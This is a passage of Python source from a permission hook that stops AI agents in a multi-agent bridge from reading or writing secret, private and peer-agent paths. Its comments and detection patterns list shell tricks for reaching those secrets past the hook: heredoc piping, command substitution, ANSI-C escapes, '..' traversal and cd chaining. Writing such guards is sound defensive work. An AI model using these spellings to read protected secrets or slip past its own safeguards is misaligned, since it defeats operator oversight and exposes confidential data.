    j = idx - 1
    # Skip a single layer of opening quote(s) glued to the target front.
    while j >= 0 and command[j] in _SHORT_NEEDLE_QUOTE_CHARS:
        j -= 1
    if j < 0:
        # Needle (after optional opening quote) is at start-of-string.
        return True
    boundary = command[j]
    if boundary in _SHORT_NEEDLE_BOUNDARY_CHARS:
        return True
    # Bash noclobber-override `>|target` — the `|` is a write redirect only
    # when preceded by `>`; a bare pipe is a command stage, not a write.
    if boundary == "|" and j >= 1 and command[j - 1] == ">":
        return True
    # A space-separated redirect target: `>` / `2>` / `<` … then whitespace
    # then the (optionally quoted) target. Skip the whitespace run and check
    # whether a redirect operator immediately precedes it (codex #1693 r3).
    if boundary in (" ", "\t"):
        k = j
        while k >= 0 and command[k] in (" ", "\t"):
            k -= 1
        if _short_needle_after_redirect_op(command, k):
            return True
    return False


def _command_substring_hits_protected_needle(command: str) -> bool:
    """Return True iff *command* contains any protected literal suffix in
    a plausible path-argument position.

    Long needles (>= :data:`_SHORT_NEEDLE_THRESHOLD` chars) match on a
    plain substring scan. Short needles fire when the needle sits at
    start-of-string OR in a write / redirect / assignment / path-
    construction position (see :func:`_short_needle_at_write_position`).
    Whitespace is intentionally NOT a boundary so heredoc prose like
    ``It's hooks/post.sh`` passes — that prose is what triggered the
    regression operator-side on 2026-05-03 (issue #509 D2). Issue #1693
    additionally drops prose-punctuation characters (quote, paren, comma,
    pipe, semicolon) from the short-needle position test: they routinely
    sit adjacent to a benign prose mention inside an unbalanced-quote body
    (``it's 'hooks/x``, ``(hooks/post.sh)``, ``a,hooks/z``) with no write
    to the path. Real argv writes — bare or quoted, including the Bash
    noclobber-override `>|target` — still deny because the position test
    looks through opening quotes to the redirect / assignment / path
    boundary (``cat >hooks/x``, ``cat >'hooks/x'``, ``cat >|hooks/x``,
    ``FOO="hooks/x"``).
    """
    for needle in protected_literal_suffixes():
        if not needle:
            continue
        if len(needle) >= _SHORT_NEEDLE_THRESHOLD:
            if needle in command:
                return True
            continue
        start = 0
        while True:
            idx = command.find(needle, start)
            if idx < 0:
                break
            if idx == 0:
                # Needle at start-of-string is path-shaped by construction.
                return True
            if _short_needle_at_write_position(command, idx):
                return True
            start = idx + 1
    return False


# Issue #1574: a single decidable shape whose heredoc body is provably inert
# DATA — safe to drop before the protected-needle substring fallback scan.
#
# Trying to prove an arbitrary shell command's heredoc body is "inert" is
# undecidable (codex r1/r2/r3 each broke a denylist/allowlist attempt with a new
# routing trick: `bash <<EOF`, `cat > >(bash) <<EOF`, then a `cmd=bash; … $cmd
# <fifo & cat >fifo <<EOF` variable-backed FIFO). So instead of classifying
# every interpreter/route, we match ONE narrow, provably-safe shape and treat
# anything else as not-strippable (→ scan the raw command = pre-#1574 deny).
#
# The shape — the legitimate "write a report file" the false-positive was about:
#
#   [VAR=val ]* (cat|tee) [ -flags / >file / >>file / ~path / ./path ]* <<'DELIM'
#   <body lines>
#   DELIM            <-- closing delimiter on its own line ENDS the command
#
# Why this is airtight:
#   1. Anchored from start-of-string and the character classes EXCLUDE every
#      shell-control / metaprogramming char (`&`, `;`, `|`, `$`, backtick, `(`,
#      `)`, and any `<`/`>` other than the heredoc opener and a simple file
#      redirect). That rejects all chaining / pipe / process-sub / command-sub /
#      background-FIFO routes in one stroke — none of them can match.
#   2. The heredoc delimiter MUST be QUOTED (`<<'EOF'` / `<<"EOF"`). A quoted
#      delimiter makes the body a pure literal: bash performs NO expansion, so a
#      `$(…)` / backtick / `$var` inside the body cannot execute. (An UNquoted
#      `<<EOF` body WOULD expand — so it is deliberately not strippable.)
#   3. The closing delimiter must be the last line, so nothing runs after the
#      heredoc (`… EOF | bash` cannot match).
#   4. Only `cat` / `tee` lead — both write stdin verbatim to their file args.
#      The redirect TARGET stays on the scan surface (the strip keeps the head
#      up to `<<'DELIM'`), so a real write whose destination IS protected — `cat
#      >hooks/evil.py <<'EOF'…`, `tee agent-roster.local.sh <<'EOF'…` — STILL
#      denies; only the literal body prose is dropped.
# A "plain path token" — no shell metachar / metaprogramming char. Covers
# absolute (`/x`), home (`~/x`), relative (`shared/r.md`), and dot-relative
# (`./x`, `../x`) targets. The excluded set is what makes the overall match
# safe: `&`, `;`, `|`, `$`, backtick, `(`, `)`, `<`, `>` can never appear in a
# strippable command, so no chaining / pipe / substitution / FIFO can sneak in.
_PLAIN_PATH = r"[^\s&;|$`()<>]+"
_SIMPLE_INERT_QUOTED_HEREDOC_RE = re.compile(
    r"^[ \t]*"
    r"(?:[A-Za-z_][A-Za-z0-9_]*=" + _PLAIN_PATH + r"?[ \t]+)*"      # leading VAR= assignments
    r"(?:/" + _PLAIN_PATH + r"/)?(?:cat|tee)\b"                     # cat|tee (optional dir path)
    r"(?:[ \t]+(?:-[A-Za-z]+|" + _PLAIN_PATH + r"|"                 # -flags, plain path args,
    r">>?[ \t]*" + _PLAIN_PATH + r"))*"                            #   and simple > / >> file redirects
    r"[ \t]*<<-?(['\"])([A-Za-z_][A-Za-z0-9_]*)\1[ \t]*\n",       # QUOTED heredoc opener, then body
    re.DOTALL,
)


def _command_is_simple_inert_quoted_heredoc_write(command: str) -> bool:
    """Return True iff *command* is the one provably-inert report-write shape
    whose heredoc body is safe to strip before the protected-needle scan.

    See :data:`_SIMPLE_INERT_QUOTED_HEREDOC_RE`. Fail-closed: any deviation
    (extra command stage, pipe, separator, process/command substitution,
    interpreter, unquoted delimiter, or trailing content after the closing
    delimiter) returns False, so the raw body stays on the scan surface and the
    pre-#1574 deny behavior is preserved.
    """
    match = _SIMPLE_INERT_QUOTED_HEREDOC_RE.match(command)
    if match is None:
        return False
    delimiter = match.group(2)
    # The closing delimiter must terminate the command (heredoc is the last
    # thing) — otherwise content after the body (e.g. `EOF | bash`) could run.
    return re.search(r"\n" + re.escape(delimiter) + r"[ \t]*\Z", command) is not None


def _command_cd_base_dir(command: str) -> Path | None:
    """Resolve the working directory established by a leading ``cd`` stage.

    Issue #1014 C: a routine diagnostic prelude — ``cd $BRIDGE_HOME &&
    grep BRIDGE agent-roster.local.sh`` — names the protected roster
    file with a CWD-relative path. The argv path check compares each
    token against the protected *absolute* path, so the relative
    ``agent-roster.local.sh`` token never matches and the roster
    allow(read)/deny(write) branch never fires — reads pass by accident
    and, worse, writes pass too (a protected-path bypass).

    This resolves a *simple* leading ``cd <dir>`` prelude so the caller
    can also test relative path fragments against ``<dir>``. Deliberately
    conservative: only a ``cd`` that is the first command stage and has
    exactly one directory argument is honored. A `cd` buried later in
    the pipeline, a `cd` with options, or a `cd -`/`cd ~`-with-no-arg is
    not resolved — those are not the #1014 shape and resolving them would
    widen surface for no benefit. Returns the absolute directory Path or
    None.

    Stage detection uses the raw command string and ``_COMMAND_OPERATOR_RE``
    — the same shell-operator model ``_is_read_intent_bash`` uses — so the
    first stage is recognized regardless of the separator form: ``&&``,
    ``;``, ``||``, ``|``, ``&``, or a newline, with or without surrounding
    whitespace. ``shlex.split`` does NOT emit ``;`` / newline as standalone
    operator tokens in the no-space form (``cd $X;echo`` arrives as a
    single ``$X;echo`` token), so relying on token equality missed those
    shapes (codex r2 catch on PR #1019).
    """
    if not command.strip():
        return None
    # First shell stage = text before the first &&/;/|/||/&/newline.
    first_stage = _COMMAND_OPERATOR_RE.split(command, maxsplit=1)[0].strip()
    if not first_stage:
        return None
    try:
        stage_tokens = shlex.split(first_stage, posix=True, comments=False)
    except ValueError:
        return None
    if len(stage_tokens) < 2 or stage_tokens[0] != "cd":
        return None
    # Exactly one argument: `cd <dir>`. Reject `cd -`, option flags, and
    # multi-arg forms — none are the #1014 prelude shape.
    dir_args = [t for t in stage_tokens[1:] if t]
    if len(dir_args) != 1:
        return None
    raw_dir = dir_args[0]
    if raw_dir.startswith("-"):
        return None
    expanded = os.path.expandvars(os.path.expanduser(raw_dir))
    if not expanded:
        return None
    try:
        candidate = Path(expanded)
    except Exception:
        return None
    if not candidate.is_absolute():
        return None
    return candidate


def _token_matches_protected(
    token: str, protected: Path, base_dir: Path | None = None
) -> bool:
    for fragment in _alias_path_fragments(token):
        expanded = os.path.expandvars(os.path.expanduser(fragment))
        if not expanded:
            continue
        try:
            candidate = Path(expanded)
        except Exception:
            continue
        if candidate == protected:
            return True
        # Issue #1014 C: a CWD-relative fragment under a resolved `cd`
        # prelude — `cd $BRIDGE_HOME && … agent-roster.local.sh` — must
        # also be tested against the prelude directory so a relative
        # reference to the protected file is detected (and the
        # read/write branch then fires correctly).
        if base_dir is not None and not candidate.is_absolute():
            try:
                if (base_dir / candidate) == protected:
                    return True
            except Exception:
                pass
    return False


# === Issue #539 follow-up: Bash carve-out for system-class read-intent ===

# Shell-language constructs that can hide text from shlex argv
# decomposition. When *any* of these is present we refuse to apply the
# system-class peer/shared read carve-out, because a visible allowed
# peer path could mask a smuggled forbidden read inside a `$(...)` body
# or here-string. patch-dev review of plan r3/r4 (2026-05-06) — see PR
# body for the detailed `cat <<< "$(cat .../private/secret.md)"` vector.
#
# Pipes / `&&` / `||` / `;` are deliberately NOT considered embeddings:
# each shell stage stays individually visible to shlex (and to
# `_is_read_intent_bash`, which already classifies stage-by-stage).
_SHELL_EMBEDDING_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\$\("),       # command substitution `$(...)`
    re.compile(r"`"),          # backticks
    re.compile(r"<\("),        # process substitution (read)
    re.compile(r">\("),        # process substitution (write)
    re.compile(r"<<"),         # heredoc / here-string (covers <<-, <<<)
    # bash 5.3 funsub (command substitution that captures output without a
    # subshell): `${ cmd; }` and `${| cmd; }`. The `{` is followed by
    # REQUIRED whitespace (space/tab/newline) or `|` — that is exactly what
    # distinguishes it from `${VAR}` / `${#x}` / `${arr[@]}` parameter
    # expansion (no space). A subshell body `${ (cmd) }` self-terminates
    # with `)`, so `_split_command_stages` does NOT split it and the stage
    # leader stays a benign read command — this gate is the only thing that
    # catches it (issue #1690 r4, proven RCE on bash 5.3.9). NEVER match
    # `${` immediately followed by a non-space char.
    re.compile(r"\$\{[ \t\n|]"),
)


def _command_has_shell_embedding(text: str) -> bool:
    """True iff *text* contains shell-language constructs that can hide
    text from shlex argv decomposition.

    The check runs against the raw text — the embedding tokens (``<<``,
    ``<<<``, ``<(``, ``>(``) are themselves the signals we want to
    catch, so we deliberately do NOT pre-strip safe redirect noise.

    Single-quoted occurrences ARE flagged here on purpose: this gate
    backs the cross-agent peer/shared substring carve-out, where a
    quoted blob can still smuggle a forbidden path the argv parser cannot
    surface. The read-intent classifier uses the quote-aware
    :func:`_command_has_unquoted_shell_embedding` instead (issue #1690 r3)
    so a single-quoted awk computed field (`awk '{print $(NF-1)}'`) — the
    shell does NOT expand it — is not mis-denied.
    """
    return any(pat.search(text) for pat in _SHELL_EMBEDDING_PATTERNS)


def _command_has_unquoted_shell_embedding(text: str) -> bool:
    """True iff *text* contains a shell expansion / embedding that the
    shell would actually EXECUTE — i.e. `$(...)`, a backtick, process
    substitution `<(`/`>(`, or a heredoc/here-string `<<` that is NOT
    inside single quotes.

    Single-quoted occurrences are ignored: the shell passes them
    literally, so `awk '{print $(NF-1)}'` (an awk computed field, not a
    command substitution) stays read-intent (issue #1690 r3). An unquoted
    or double-quoted `$(...)` / backtick still runs a command and is
    flagged. Fail-closed on an unterminated quote.
    """
    i = 0
    n = len(text)
    in_sq = False
    in_dq = False
    while i < n:
        c = text[i]
        if in_sq:
            if c == "'":
                in_sq = False
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            i += 2  # backslash escape (outside single quotes)
            continue
        if c == "'" and not in_dq:
            in_sq = True
            i += 1
            continue
        if c == '"':
            in_dq = not in_dq
            i += 1
            continue
        # Not inside single quotes here — the shell would expand/execute.
        if c == "`":
            return True
        if c == "$" and i + 1 < n and text[i + 1] == "(":
            return True
        # bash 5.3 funsub `${ cmd; }` / `${| cmd; }` — `${` followed by
        # whitespace/`|` runs a command (issue #1690 r4). The required
        # space is the discriminator from `${VAR}` parameter expansion;
        # `${` followed by any non-space char is param expansion and is NOT
        # flagged. (Inside double quotes `${ … }` still executes, so we
        # check it here in the not-single-quoted branch.)
        if (
            c == "$"
            and i + 2 < n
            and text[i + 1] == "{"
            and text[i + 2] in (" ", "\t", "\n", "|")
        ):
            return True
        if c in ("<", ">") and i + 1 < n and text[i + 1] == "(":
            return True
        if c == "<" and i + 1 < n and text[i + 1] == "<":
            return True
        i += 1
    if in_sq:
        return True  # unterminated single quote → un-parseable → fail-closed
    return False


# Protected-path carve-out deny reason for a command whose paths cannot be
# statically resolved (issue #1690 r4 FIX 2).
PATH_EXPANSION_CARVEOUT_DENY_REASON = (
    "protected-path read blocked: the command spells a path via a shell "
    "expansion ($VAR / ${VAR} / ~ / brace) that cannot be resolved "
    "statically, so a forbidden sibling path could be hidden. Use a "
    "literal absolute path or the `agb` queue commands."
)


def _has_unresolved_path_expansion(text: str) -> bool:
    """True iff *text* contains a path-spelling shell expansion the
    analyzer cannot reduce to a literal — parameter expansion (`$VAR` /
    `${VAR}`), tilde (`~`, `~user`), or brace expansion (`{a,b}`) —
    OUTSIDE single quotes (the shell expands these before the command
    runs).

    Issue #1690 r4 FIX 2: the protected-path carve-outs only grant a read
    when they can statically SEE every literal path the command touches.
    A var/tilde/brace path spelling hides a path from that analysis (e.g.
    `cat <tasks.db> ${BRIDGE_HOME}/shared/secrets/x` — the literal
    secrets path never appears, so the substring sibling gate misses it).
    When this returns True AND a protected-path carve-out is about to be
    granted, the caller fails closed.

    Deliberately does NOT flag:
      - `$(` command substitution / `${ ` funsub — already caught by the
        shell-embedding gate.
      - single-quoted occurrences — the shell passes them literally.
      - a `~` that is not at a word start (`foo~bar` is a literal).
    """
    i = 0
    n = len(text)
    in_sq = False
    in_dq = False
    word_start = True
    while i < n:
        c = text[i]
        if in_sq:
            if c == "'":
                in_sq = False
            word_start = False
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            word_start = False
            i += 2  # backslash escape outside single quotes
            continue
        if c == "'" and not in_dq:
            in_sq = True
            word_start = False
            i += 1
            continue
        if c == '"':
            in_dq = not in_dq
            word_start = False
            i += 1
            continue
        if c == "$" and i + 1 < n:
            nx = text[i + 1]
            # `${VAR}` parameter expansion — but NOT the funsub `${ ` form
            # (a non-space after `{`); `$(` is command-sub (embedding gate).
            if nx == "{" and i + 2 < n and text[i + 2] not in (" ", "\t", "\n", "|"):
                return True
            if nx != "(" and (nx.isalpha() or nx == "_"):
                return True  # `$VAR`
        # Tilde home expansion only at a word start (`~`, `~user`); a `~`
        # mid-word (`foo~bar`) is a literal.
        if c == "~" and word_start and not in_dq:
            return True
        # Brace expansion `{a,b}` (a brace group containing a comma) — a
        # path multiplier the analyzer cannot enumerate. Outside quotes
        # only; `${ … }` was already handled above (the `$` precedes it).
        if c == "{" and not in_dq:
            depth = 0
            j = i
            saw_comma = False
            while j < n:
                cj = text[j]
                if cj == "'" or cj == '"':
                    break  # quote inside the group — give up, not a clean brace
                if cj == "{":
                    depth += 1
                elif cj == "}":
                    depth -= 1
                    if depth == 0:
                        break
                elif cj == "," and depth == 1:
                    saw_comma = True
                j += 1
            if saw_comma:
                return True
        word_start = c in (" ", "\t", "\n")
        i += 1
    return False


def _peer_alias_list(agent: str) -> list[str]:
    """Return the substring-deny needle list for cross-agent home
    references. Each peer agent contributes six variants (with/without
    trailing slash, expanded vs ``~`` vs ``$HOME``). Stable order so
    deny messages are deterministic.

    NOTE — same prefix-spelling incompleteness as
    :func:`_shared_forbidden_aliases` (issue #1709): the brace ``${HOME}``,
    ``$BRIDGE_HOME``, ``${BRIDGE_HOME}`` peer-home spellings are NOT in this
    list, so a raw ``alias in text`` check alone lets a non-admin read a
    peer home spelled ``${HOME}/.agent-bridge/agents/<other>/MEMORY.md``.
    The authoritative non-admin Stage-B deny is the suffix matcher
    :func:`_forbidden_suffix_in_command`, keyed off the same peer-name SSOT
    (``other_agent_homes``). This list is retained for the deterministic
    deny-reason text and the admin-carve-out audit ledger.
    """
    home_root = agent_home_root()
    aliases: list[str] = []
    for other in other_agent_homes(agent):
        name = _peer_home_agent_name(other)
        aliases.extend(
            (
                f"{home_root}/{name}/",
                f"{home_root}/{name}",
                f"~/.agent-bridge/agents/{name}/",
                f"~/.agent-bridge/agents/{name}",
                f"$HOME/.agent-bridge/agents/{name}/",
                f"$HOME/.agent-bridge/agents/{name}",
            )
        )
    # Issue #1823 NOTE: the v2 ``<peer>/home`` absolute spelling is deliberately
    # NOT added here. `matched_alias` (computed from this list at the Stage-B
    # call site) is NOT admin-gated, so adding the v2 spelling would DENY an
    # admin's legitimately-allowed v2 peer write — changing admin behavior. The
    # authoritative non-admin v2-home deny is the admin-gated suffix matcher
    # `_peer_forbidden_suffixes` (prefix-spelling-agnostic, `/agents/<name>/home`).
    return aliases


def _shared_forbidden_aliases() -> list[str]:
    """Return the substring-deny list for ``shared/private/`` and
    ``shared/secrets/``. Includes absolute, ``~``, and ``$HOME``
    variants — both with and without a trailing slash — so a bare
    directory reference (``ls ~/.agent-bridge/shared/private``) is
    caught. patch-dev review of 94711d3 caught the no-slash variant gap.

    NOTE — this enumerated alias list is NOT prefix-spelling-complete and
    must NOT be relied on alone for the non-admin Stage-A deny. It omits
    the brace form ``${HOME}``, ``$BRIDGE_HOME``, ``${BRIDGE_HOME}``, and
    any future env-var prefix; ``${HOME}/…`` is not a substring of
    ``$HOME/…`` so a brace/``$BRIDGE_HOME``-spelled secret path slips past
    a raw ``alias in text`` check (issue #1709, a HIGH confidentiality
    bypass). These aliases are kept only as a deterministic, human-readable
    deny-reason source and as defense-in-depth for the admin-carve-out
    audit path. The authoritative non-admin Stage-A deny is the
    prefix-spelling-agnostic suffix matcher
    :func:`_forbidden_suffix_in_command` (see ``protected_alias_reason``),
    which keys off ``_SHARED_FORBIDDEN_PREFIXES`` (the same SSOT) and so
    cannot drift from this list.
    """
    bridge_home = bridge_home_dir()
    aliases: list[str] = []
    for forbidden in _SHARED_FORBIDDEN_PREFIXES:
        rel = forbidden.rstrip("/")
        aliases.extend(
            (
                f"{bridge_home}/shared/{rel}/",
                f"{bridge_home}/shared/{rel}",
                f"~/.agent-bridge/shared/{rel}/",
                f"~/.agent-bridge/shared/{rel}",
                f"$HOME/.agent-bridge/shared/{rel}/",
                f"$HOME/.agent-bridge/shared/{rel}",
            )
        )
    return aliases


# Issue #1709 — resolved-PATH forbidden-tree matcher (r3 path-modeling).
#
# The enumerated alias lists above are a substring blacklist over a FIXED
# set of prefix spellings (absolute / `~` / `$HOME`). They miss the brace
# form `${HOME}`, `$BRIDGE_HOME`, `${BRIDGE_HOME}`, and any future env-var
# prefix — a HIGH confidentiality bypass for a non-admin secret/private
# read. r1/r2 closed prefix spellings + `//`/`/./`/backslash/cd-relative by
# normalizing the TEXT and re-scanning for the forbidden SUFFIX, but a text
# scan structurally cannot model the path RESOLUTION bash performs: `..`
# parent-traversal and cwd depth accumulated across `cd`s kept leaking
# (`shared/wiki/../secrets`, `cd shared && cat secrets/token`). r3 pivots to
# MODELING the path — fold literal `cd`/`pushd` targets into an effective
# cwd, resolve each read-candidate word (expand the bridge-known prefixes,
# decode the bash literals, `os.path.normpath` to fold `..`/`//`/`/./`), and
# DENY when the RESOLVED absolute path is — or sits under — a forbidden tree
# derived from the SAME SSOTs (`_SHARED_FORBIDDEN_PREFIXES` / per-peer
# `/agents/<name>`). One sound check closes every spelling AND every
# traversal form. Obfuscation / unresolvable words still fail CLOSED.
# Symlink-through + `$var` indirection are out of static scope (class-(b));
# the TRUE read boundary is FS perms (iso-v2 group ownership) — this hook is
# defense-in-depth. See `_forbidden_suffix_in_command` for the full model.

# Glob / wildcard chars that let a word expand to a forbidden path at
# runtime without the literal suffix ever appearing in the command text.
_OBFUSCATION_GLOB_CHARS = frozenset({"*", "?", "[", "]"})


def _shared_forbidden_suffixes() -> list[str]:
    """Forbidden path SUFFIXES for the team-shared secret/private trees,
    derived from the same ``_SHARED_FORBIDDEN_PREFIXES`` SSOT the alias
    list uses (so the two can never drift). Returned without a trailing
    slash; the matcher treats end-of-word and a following ``/`` alike.

    e.g. ``["/shared/private", "/shared/secrets"]``.
    """
    return [f"/shared/{forbidden.rstrip('/')}" for forbidden in _SHARED_FORBIDDEN_PREFIXES]


def _peer_forbidden_suffixes(agent: str) -> list[str]:
    """Forbidden path SUFFIXES for cross-agent peer homes, derived from the
    same ``other_agent_homes`` SSOT ``_peer_alias_list`` uses.

    e.g. ``["/agents/other-a", "/agents/other-b/home"]``. The
    ``/agents/<name>`` (v1) / ``/agents/<name>/home`` (v2, issue #1823) suffix
    is prefix-spelling-agnostic: it matches the absolute home-root spelling
    (``…/.agent-bridge/agents/<name>``), the ``~`` / ``$HOME`` / ``${HOME}`` /
    ``$BRIDGE_HOME`` / ``${BRIDGE_HOME}`` / ``$BRIDGE_DATA_ROOT`` spellings, and
    any future env-var prefix, all of which end in that suffix. The v2 variant
    is scoped to ``/home`` so a peer's ``/workdir`` (the #1492 shared-pair
    workspace) is NOT denied — see `other_agent_homes`.
    """
    return [_peer_home_suffix(other) for other in other_agent_homes(agent)]


# Bridge-home anchor tokens. A path word containing one of these is rooted
# under the operator bridge home, so a `/agents/` parent marker in it refers
# to the runtime PEER tree — not a same-named `agents/` directory in a source
# repo or elsewhere. Used to scope the Stage-B glob fail-close so a benign
# repo read (`cat ./agents/*.md`) is not collateral-damaged (issue #1709).
def _bridge_anchor_tokens() -> list[str]:
    """Raw-text tokens that prove a path word is rooted under the operator
    bridge home: the absolute home, the canonical ``/.agent-bridge/`` install
    dir name, and the ``$BRIDGE_HOME`` / ``${BRIDGE_HOME}`` env spellings.
    """
    return [
        f"{bridge_home_dir()}/",
        "/.agent-bridge/",
        "$BRIDGE_HOME/",
        "${BRIDGE_HOME}/",
    ]


_ANSIC_RE = re.compile(r"\$'((?:\\.|[^'\\])*)'")


def _decode_obfuscated_word(word: str) -> str:
    """Return *word* with ANSI-C ``$'…'`` segments and bare backslash
    hex/octal/escape sequences decoded to the literal bytes bash would
    produce at runtime, so a hidden separator / dir name (``$'\\x2fsecrets'``,
    ``secre\\x74s``) is surfaced for the literal suffix scan. Var / glob /
    command-sub expansion is NOT performed (those are handled separately).
    A decode failure returns the word unchanged (the obfuscation flag still
    forces the fail-close path, so this never opens a hole)."""

    def _ansic(match: re.Match) -> str:
        body = match.group(1)
        try:
            return body.encode("latin-1", "backslashreplace").decode("unicode_escape")
        except Exception:  # noqa: BLE001 — decode failure → leave literal
            return match.group(0)

    decoded = _ANSIC_RE.sub(_ansic, word)
    # Outside ANSI-C `$'…'`, bash treats an unquoted backslash as "preserve the
    # literal value of the next character": `\X` → `X` for ANY X. bash does NOT
    # hex/octal/escape-decode outside `$'…'`, so `secre\ts` runs as `secrets`
    # (NOT `secre<TAB>s`), `priv\ate` as `private`, `peer\-1709` as `peer-1709`
    # (codex r2 #11763). Model that with a literal backslash strip — NOT
    # unicode_escape, which wrongly turns `\t`→TAB (MISSING the bypass) and
    # `\x74`→`t` (over-blocking a path bash would read as the harmless
    # `secrex74s`). `\<newline>` is a line continuation (both chars removed).
    if "\\" in decoded:
        decoded = decoded.replace("\\\r\n", "").replace("\\\n", "")
        decoded = re.sub(r"\\(.)", r"\1", decoded, flags=re.DOTALL)
    return decoded


def _word_carries_obfuscation(word: str) -> bool:
    """True iff *word* contains shell expansion / encoding that can hide a
    forbidden suffix from the literal-suffix scan at runtime.

    Catches (issue #1709 fail-close):
      - ANSI-C quoting ``$'…'`` — bash decodes ``$'\\x2f'`` → ``/`` at run
        time, so the literal forbidden suffix never appears in raw text.
      - command substitution ``$(…)`` / backticks — the path comes from a
        subshell.
      - glob / wildcard chars (``* ? [ ]``) — the word expands to a path
        the static scan cannot see.
      - backslash escapes — ``\\x``/``\\057`` style or any ``\\`` that can
        re-spell a separator.

    A plain literal path word (``/abs/path``, ``~/p``, ``$HOME/p``,
    ``${HOME}/p``, ``$BRIDGE_HOME/p``, ``${BRIDGE_HOME}/p``) carries NONE
    of these and is left to the suffix scan. ``$VAR`` / ``${VAR}`` plain
    parameter expansion is deliberately NOT treated as obfuscation here —
    it cannot re-spell the forbidden suffix INSIDE the word (only prefix
    it), and the suffix scan already sees the literal ``/shared/secrets``
    tail; flagging it would over-block legitimate ``$HOME``-relative reads.
    """
    if "$'" in word:
        return True  # ANSI-C quoting
    if "`" in word:
        return True  # backtick command substitution
    if "$(" in word:
        return True  # command substitution
    if "\\" in word:
        return True  # backslash escape (hex/octal or separator re-spell)
    if any(ch in _OBFUSCATION_GLOB_CHARS for ch in word):
        return True  # glob expansion
    return False


# ---------------------------------------------------------------------------
# Issue #1709 r3 — PATH-MODELING core (replaces the r1/r2 spelling-match).
#
# r1/r2 normalized ever-more bash path SPELLINGS (brace/`$BRIDGE_HOME`,
# `//`/`/./`, backslash `\X`→`X`, cd-relative) and re-ran a literal forbidden-
# SUFFIX text scan. Both reviewers (codex #11772, patch #11773) proved each
# round still leaked via the NEXT resolution form bash performs but a text
# scan cannot model — `..` parent-traversal and cwd depth accumulated across
# `cd`s:
#     cat $BRIDGE_HOME/shared/wiki/../secrets/token     # `..` past a sibling
#     cd $BRIDGE_HOME/shared && cat secrets/token        # cd into a SUBDIR
#     cd $BRIDGE_HOME; cd shared; cat secrets/token       # multi-step cd depth
# A literal-suffix scan structurally cannot fold `..` or track accumulated cwd.
#
# The pivot: MODEL the path the way the kernel resolves it, then test the
# RESOLVED absolute path for containment in a forbidden tree — one sound check
# that closes `..`, cwd-depth, multi-`cd`, and every separator/`.`-segment
# form at once. We:
#   1. fold the command's literal `cd`/`pushd` targets left-to-right into an
#      effective cwd (absolute, or UNKNOWN when it can't be anchored);
#   2. for each read-candidate word, expand the bridge-known prefixes
#      (`~`/`$HOME`/`${HOME}`/`$BRIDGE_HOME`/`${BRIDGE_HOME}`) and decode the
#      already-handled bash literals (ANSI-C `$'…'`, ordinary backslash
#      `\X`→`X`), join under the effective cwd if relative, and
#      `os.path.normpath` — which folds `..`, `//`, `/./`;
#   3. DENY when the resolved absolute path is the forbidden dir or sits
#      under it (`== d or startswith(d + os.sep)`).
# Obfuscation/unresolvable words still fail closed (Pass 2, unchanged model).
#
# Soundness boundary (class-(b), NOT claimed closed by this text analysis):
#   - SYMLINK-through: lexical `os.path.normpath` folds `..` purely on the
#     string; through a SYMLINKED component the kernel resolves differently,
#     so a `..` that crosses a symlink is unsound here. This is runtime FS
#     state a static hook cannot see.
#   - `$var` cd-target / read-prefix the hook cannot resolve (only HOME +
#     BRIDGE_HOME are known): fail closed when bridge-anchored-suspect (a `cd`
#     into an unresolved `$var` POISONS the cwd so a later relative read of a
#     forbidden tail denies), otherwise left to the agent's own cwd — we do
#     NOT over-block a `$var` relative to the agent's real workdir.
#   - eval / `bash -c` / `$()` command-sub indirection: #341 / #1738.
# The TRUE confidentiality boundary for a read is FILESYSTEM PERMISSIONS — on
# an iso-v2 install `shared/secrets` is group-owned and unreadable by a
# non-admin UID regardless of how the path is spelled. This hook is
# DEFENSE-IN-DEPTH over the static-path class; symlink-through and
# var-indirection are covered by FS perms, not by this text analysis.
# ---------------------------------------------------------------------------

# Effective-cwd sentinels. `_CWD_UNKNOWN` = the agent's real cwd, which the
# hook cannot see (a relative read here is relative to the agent's own
# workdir → not anchorable under the bridge → not over-blocked).
# `_CWD_POISONED` = a `cd` into an expression that COULD resolve to the bridge
# home but the hook can't prove it (an unresolved `$var`) — a later relative
# read of a forbidden tail under it fails closed.
_CWD_UNKNOWN = None
_CWD_POISONED = "\x00POISONED\x00"

# Bounded-chain exit sentinel for the &&/|| evaluator (codex r9 #11815): a
# `cd`/`pushd`/`popd` command almost always SUCCEEDS — so `&&` after it
# continues the chain — but it CAN fail (a missing dir), so a following `||`
# branch MAY still run. Distinct from the literal True/False/None exits so the
# evaluator can commit a cd-OUT cwd on the `&&` continuation while keeping a
# `cd <missing> || cd <bridge>` chain sound on the `||` side.
_CD_LIKELY_SUCCESS = "\x00CD_OK\x00"


def _expand_bridge_prefixes(word: str) -> str:
    """Expand ONLY the bridge-known location prefixes in *word* — ``~`` /
    ``$HOME`` / ``${HOME}`` → the home dir, ``$BRIDGE_HOME`` / ``${BRIDGE_HOME}``
    → the operator bridge home — and leave every OTHER ``$var`` literal.

    Deliberately does NOT call :func:`os.path.expandvars`, which would leak
    the arbitrary process environment into the resolved path (a
    security-sensitive over-reach: an attacker-influenced variable could
    re-spell a benign word into the secret tree, or mask a real one). Only
    ``HOME`` and ``BRIDGE_HOME`` are trusted location anchors. A surviving
    ``$`` in the result signals an unresolved expansion the caller must treat
    as fail-closed-where-suspect.
    """
    try:
        home = str(bridge_home_dir())
    except Exception:  # noqa: BLE001 — bridge home unresolved → expand only ~
        home = ""
    out = word
    if out.startswith("~"):
        out = os.path.expanduser(out)
    # Brace forms are unambiguous; the bare `$NAME` forms must NOT swallow a
    # longer var name (`$HOMEDIR` is not `$HOME`), so the bare form is only
    # replaced when followed by a non-identifier char (`/`, end, etc.).
    if home:
        out = out.replace("${BRIDGE_HOME}", home)
        out = re.sub(r"\$BRIDGE_HOME(?![A-Za-z0-9_])", lambda _m: home, out)
    home_dir = os.path.expanduser("~")
    if home_dir and home_dir != "~":
        out = out.replace("${HOME}", home_dir)
        out = re.sub(r"\$HOME(?![A-Za-z0-9_])", lambda _m: home_dir, out)
    return out


# Non-forking cd wrappers: `command`/`builtin` (each with its own option
# grammar) and the `time` reserved word all leave the `cd` running in THIS
# shell, so they change the cwd. `nice`/`nohup`/`env`/subshell fork, so they do
# NOT change the parent cwd and are intentionally absent.
_CWD_WRAPPER_WORDS = frozenset({"command", "builtin", "time"})

# Bash reserved words / group-openers that can PRECEDE a cwd-changing command in
# a compound command whose body runs in the CURRENT shell (so the `cd` persists,
